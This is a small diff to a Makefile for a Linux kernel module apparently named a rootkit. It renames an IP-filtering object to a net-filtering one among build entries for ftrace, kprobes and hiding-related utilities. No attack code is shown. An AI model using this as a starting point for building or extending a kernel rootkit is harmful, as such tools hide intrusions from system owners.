@@ -11,7 +11,7 @@ $(MODULE_NAME)-objs := src/mod_rootkit.o \
                        src/utils/ftrace_utils.o \
                        src/utils/kprobes_utils.o \
                        src/utils/proc_utils.o \
-                       src/utils/excludes/ip_filtering.o \
+                       src/utils/excludes/net_filtering.o \
                        src/utils/excludes/string_filtering.o
 
 EXTRA_CFLAGS += -I$(PWD)/include \
